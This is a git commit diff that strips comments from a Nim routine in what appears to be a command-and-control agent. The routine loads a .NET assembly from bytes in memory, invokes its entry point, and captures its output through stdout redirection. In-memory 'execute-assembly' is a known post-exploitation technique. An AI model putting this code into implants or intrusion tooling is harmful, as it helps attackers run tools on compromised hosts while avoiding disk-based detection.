d6c917aeab923aada4d4311b99711bd2f3f01cba
Ph3nX-Z <66122220+Ph3nX-Z@users.noreply.github.com>
2024-02-08 15:55:31 +0100

    Update executeass.nim

--- raw_agents/libs_agent/executeass.nim
+++ raw_agents/libs_agent/executeass.nim
@@ -1,7 +1,6 @@
 import winim/clr
 import os
 
-#Create dup handles
 proc dup(oldfd: FileHandle): FileHandle {.importc, header: "unistd.h".}
 proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc,
     header: "unistd.h".}
@@ -9,10 +8,7 @@ proc dup2(oldfd: FileHandle, newfd: FileHandle): cint {.importc,
 func convertToByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
 
-
-# thanks Clonk from https://forum.nim-lang.org/t/6909
 proc executeassembly(assembly_bytes: openarray[byte], args: openarray[string], tmpname: string) : string =
-  # input redirection begins
   let tmpFileName = getTempDir() & tmpname
   
   var stdout_fileno = stdout.getFileHandle()
@@ -21,15 +17,12 @@ proc executeassembly(assembly_bytes: openarray[byte], args: openarray[string], t
   var tmp_file: File = open(tmpFileName, fmWrite)
   var tmp_file_fd: FileHandle = tmp_file.getFileHandle()
   
-  # dup2 tmp_file_fd to stdout_fileno -> writing to stdout_fileno now writes to tmp_file
   discard dup2(tmp_file_fd, stdout_fileno)
   
-  #actual execution
   var dotnetargs = toCLRVariant(args, VT_BSTR)
   var assembly = load(assembly_bytes)
   assembly.EntryPoint.Invoke(nil, toCLRVariant([dotnetargs]))
 
-  # input redirection ends
   tmp_file.flushFile()
   tmp_file.close()
   discard dup2(stdout_dupfd, stdout_fileno)
